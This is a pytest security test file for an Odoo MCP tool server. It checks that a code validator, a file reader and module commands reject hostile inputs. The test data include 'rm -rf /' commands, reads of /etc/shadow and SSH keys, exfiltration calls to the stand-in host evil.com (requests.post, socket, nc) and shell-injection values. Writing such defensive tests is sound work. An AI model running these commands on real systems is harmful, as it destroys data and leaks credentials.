import os
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from odoo_intelligence_mcp.tools.code.execute_code import execute_code
from odoo_intelligence_mcp.tools.code.read_odoo_file import read_odoo_file
from odoo_intelligence_mcp.tools.operations.module_update import odoo_update_module
from odoo_intelligence_mcp.utils.security_utils import CodeSecurityValidator


class TestCodeInjectionPrevention:
    @pytest.mark.asyncio
    async def test_prevent_os_system_execution(self) -> None:
        dangerous_code = [
            "import os; os.system('rm -rf /')",
            "__import__('os').system('cat /etc/passwd')",
            'eval(\'__import__("os").system("ls")\')',
            'exec(\'import subprocess; subprocess.call(["rm", "-rf", "/"])\')',
        ]

        validator = CodeSecurityValidator()
        for code in dangerous_code:
            result = validator.validate_code(code)
            assert result["is_valid"] is False
            assert "security" in result["error"].lower()

    @pytest.mark.asyncio
    async def test_prevent_file_system_access(self) -> None:
        dangerous_code = [
            "open('/etc/passwd', 'r').read()",
            "with open('../../../../../../etc/passwd') as f: data = f.read()",
            "import shutil; shutil.rmtree('/')",
            "__builtins__['open']('/etc/shadow')",
        ]

        validator = CodeSecurityValidator()
        for code in dangerous_code:
            result = validator.validate_code(code)
            assert result["is_valid"] is False

    @pytest.mark.asyncio
    async def test_prevent_network_access(self) -> None:
        dangerous_code = [
            "import socket; s = socket.socket(); s.connect(('evil.com', 1337))",
            "import urllib.request; urllib.request.urlopen('http://evil.com/steal')",
            "import requests; requests.post('http://evil.com', data={'stolen': env})",
        ]

        validator = CodeSecurityValidator()
        for code in dangerous_code:
            result = validator.validate_code(code)
            assert result["is_valid"] is False or "import" in result.get("warning", "")

    @pytest.mark.asyncio
    async def test_allow_safe_odoo_operations(self) -> None:
        safe_code = [
            "result = env['res.partner'].search([('is_company', '=', True)])",
            "partner = env['res.partner'].create({'name': 'Test'})",
            "env.cr.execute('SELECT id, name FROM res_partner LIMIT 10')",
            "result = env['product.template'].search_count([])",
        ]

        validator = CodeSecurityValidator()
        for code in safe_code:
            result = validator.validate_code(code)
            assert result["is_valid"] is True


class TestPathTraversalPrevention:
    @pytest.mark.asyncio
    async def test_prevent_path_traversal_in_read(self) -> None:
        dangerous_paths = [
            "../../../../../../etc/passwd",
            "/etc/passwd",
            "../../../.env",
            "~/.ssh/id_rsa",
            "${HOME}/.aws/credentials",
        ]

        mock_env = AsyncMock()
        for path in dangerous_paths:
            result = await read_odoo_file(mock_env, path)
            assert "error" in result or "not found" in result.get("error", "").lower()

    @pytest.mark.asyncio
    async def test_restrict_file_access_to_odoo_paths(self) -> None:
        allowed_paths = [
            "sale/models/sale_order.py",
            "addons/product/views/product_views.xml",
            "/odoo/addons/account/models/account_move.py",
        ]

        mock_env = AsyncMock()
        mock_env.execute_code = AsyncMock(return_value={"content": "file content"})

        for path in allowed_paths:
            with patch("subprocess.run") as mock_run:
                mock_run.return_value = MagicMock(returncode=0, stdout="file content")
                result = await read_odoo_file(mock_env, path)
                assert "error" not in result or "content" in result


class TestCommandInjectionPrevention:
    @pytest.mark.asyncio
    async def test_prevent_command_injection_in_module_ops(self) -> None:
        dangerous_inputs = [
            "sale; rm -rf /",
            "sale && cat /etc/passwd",
            "sale | nc evil.com 1337",
            "sale`whoami`",
            "sale$(id)",
        ]

        mock_env = AsyncMock()
        for dangerous_input in dangerous_inputs:
            with patch("subprocess.run") as mock_run:
                mock_run.return_value = MagicMock(returncode=0, stdout="")

                result = await odoo_update_module(mock_env, dangerous_input)

                if mock_run.called:
                    cmd = mock_run.call_args[0][0]
                    assert ";" not in str(cmd) or dangerous_input not in str(cmd)
                    assert "&&" not in str(cmd) or dangerous_input not in str(cmd)
                    assert "|" not in str(cmd) or dangerous_input not in str(cmd)

    @pytest.mark.asyncio
    async def test_sanitize_container_names(self) -> None:
        dangerous_names = [
            "odoo; docker run -it --rm alpine",
            "odoo && docker exec -it postgres psql",
            "odoo | tee /tmp/leak",
        ]

        for name in dangerous_names:
            with patch.dict(os.environ, {"ODOO_CONTAINER_PREFIX": name}):
                from odoo_intelligence_mcp.core.env import HostOdooEnvironment

                env = HostOdooEnvironment(name, "odoo", "/test")
                assert ";" not in env.container_prefix
                assert "&&" not in env.container_prefix
                assert "|" not in env.container_prefix


class TestPrivilegeEscalationPrevention:
    @pytest.mark.asyncio
    async def test_prevent_sudo_usage(self) -> None:
        dangerous_code = [
            "import subprocess; subprocess.run(['sudo', 'cat', '/etc/shadow'])",
            "os.system('sudo rm -rf /')",
        ]

        validator = CodeSecurityValidator()
        for code in dangerous_code:
            result = validator.validate_code(code)
            assert result["is_valid"] is False

    @pytest.mark.asyncio
    async def test_prevent_user_switching(self) -> None:
        dangerous_code = [
            "os.setuid(0)",
            "os.setgid(0)",
            "os.seteuid(0)",
        ]

        validator = CodeSecurityValidator()
        for code in dangerous_code:
            result = validator.validate_code(code)
            assert result["is_valid"] is False or "warning" in result


class TestDataExfiltrationPrevention:
    @pytest.mark.asyncio
    async def test_prevent_environment_variable_access(self) -> None:
        dangerous_code = [
            "import os; secrets = os.environ",
            "password = os.getenv('DB_PASSWORD')",
            "api_key = os.environ['API_KEY']",
        ]

        validator = CodeSecurityValidator()
        for code in dangerous_code:
            result = validator.validate_code(code)
            if "os.environ" in code or "os.getenv" in code:
                assert result["is_valid"] is False or "warning" in result

    @pytest.mark.asyncio
    async def test_prevent_sensitive_file_access(self) -> None:
        sensitive_files = [
            ".env",
            "config.ini",
            "odoo.conf",
            ".git/config",
            "docker-compose.yml",
        ]

        mock_env = AsyncMock()
        for file_path in sensitive_files:
            result = await read_odoo_file(mock_env, file_path)
            assert "error" in result or "not allowed" in str(result).lower()


class TestRateLimitingAndDoS:
    @pytest.mark.asyncio
    async def test_limit_concurrent_executions(self) -> None:
        import asyncio

        mock_env = AsyncMock()
        mock_env.execute_code = AsyncMock()

        async def delayed_response():
            await asyncio.sleep(0.1)
            return {"result": "done"}

        mock_env.execute_code.side_effect = delayed_response

        tasks = [execute_code(mock_env, f"result = {i}") for i in range(100)]

        start_time = asyncio.get_event_loop().time()
        results = await asyncio.gather(*tasks, return_exceptions=True)
        elapsed = asyncio.get_event_loop().time() - start_time

        assert elapsed > 0.1
        errors = [r for r in results if isinstance(r, Exception)]
        assert len(errors) < len(results)

    @pytest.mark.asyncio
    async def test_prevent_infinite_loops(self) -> None:
        dangerous_code = [
            "while True: pass",
            "for i in iter(int, 1): pass",
            "[i for i in range(10**10)]",
        ]

        mock_env = AsyncMock()
        mock_env.execute_code = AsyncMock(side_effect=TimeoutError("Execution timeout"))

        for code in dangerous_code:
            result = await execute_code(mock_env, code)
            assert "error" in result or "timeout" in str(result).lower()
